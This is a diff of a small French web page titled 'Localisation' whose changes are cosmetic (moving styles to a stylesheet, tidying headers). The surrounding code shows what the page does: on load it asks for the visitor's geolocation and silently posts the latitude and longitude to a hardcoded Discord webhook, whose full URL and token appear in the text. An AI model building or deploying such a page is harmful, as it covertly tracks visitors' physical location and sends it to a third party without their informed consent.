@@ -3,26 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <title>Localisation</title>
-  <style>
-    body {
-      background-color: black;
-      color: white;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      text-align: center;
-    }
-    #message {
-      font-size: 24px;
-      padding: 20px;
-    }
-  </style>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
   <div id="message">Autorise la localisation…</div>
 
   <script>
@@ -33,9 +16,7 @@
       // Envoi vers le webhook Discord
       fetch("https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           content: `📍 Nouvelle localisation reçue :\nLatitude : ${lat}\nLongitude : ${lng}`
         })
@@ -64,7 +45,6 @@
       document.getElementById("message").innerText = message;
     }
 
-    // Exécution au chargement de la page
     window.onload = function () {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
@@ -73,6 +53,5 @@
       }
     };
   </script>
-
 </body>
 </html>
